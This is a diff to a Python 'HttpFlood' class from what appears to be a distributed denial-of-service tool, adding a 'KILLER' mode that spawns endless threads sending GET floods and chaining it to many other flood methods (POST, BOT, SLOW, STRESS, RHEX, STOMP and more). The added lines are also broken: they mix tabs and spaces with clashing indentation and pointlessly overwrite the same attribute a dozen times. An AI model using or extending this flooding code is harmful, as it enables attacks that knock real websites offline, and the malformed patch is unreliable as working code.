@@ -4537,7 +4537,7 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
+        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "KILLER", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
@@ -4634,6 +4634,7 @@ class HttpFlood(Thread):
     def KILLER(self) -> None:
         while True:
             Thread(target=self.GET, daemon=True).start()
+
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
@@ -4943,6 +4944,20 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.POST
         if name == "CFB":
             self.SENT_FLOOD = self.CFB
+		if name == "KILLER":
+            self.SENT_FLOOD = self.KILLER	
+			self.SENT_FLOOD = self.GET
+			self.SENT_FLOOD = self.POST
+			self.SENT_FLOOD = self.BOT
+			self.SENT_FLOOD = self.SLOW
+			self.SENT_FLOOD = self.STRESS
+            self.SENT_FLOOD = self.DYN
+            self.SENT_FLOOD = self.SLOW
+            self.SENT_FLOOD = self.GSB
+            self.SENT_FLOOD = self.RHEX
+            self.SENT_FLOOD = self.STOMP
+            self.SENT_FLOOD = self.NULL
+            self.SENT_FLOOD = self.COOKIES
         if name == "CFBUAM":
             self.SENT_FLOOD = self.CFBUAM
         if name == "XMLRPC":
@@ -4985,7 +5000,21 @@ class HttpFlood(Thread):
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
-        if name == "KILLER": self.SENT_FLOOD = self.KILLER
+        if name == "KILLER":
+			 self.SENT_FLOOD = self.KILLER
+			 self.SENT_FLOOD = self.GET
+			self.SENT_FLOOD = self.POST
+			self.SENT_FLOOD = self.BOT
+			self.SENT_FLOOD = self.SLOW
+			self.SENT_FLOOD = self.STRESS
+            self.SENT_FLOOD = self.DYN
+            self.SENT_FLOOD = self.SLOW
+            self.SENT_FLOOD = self.GSB
+            self.SENT_FLOOD = self.RHEX
+            self.SENT_FLOOD = self.STOMP
+            self.SENT_FLOOD = self.NULL
+            self.SENT_FLOOD = self.COOKIES
+
 
 
 class ProxyManager:
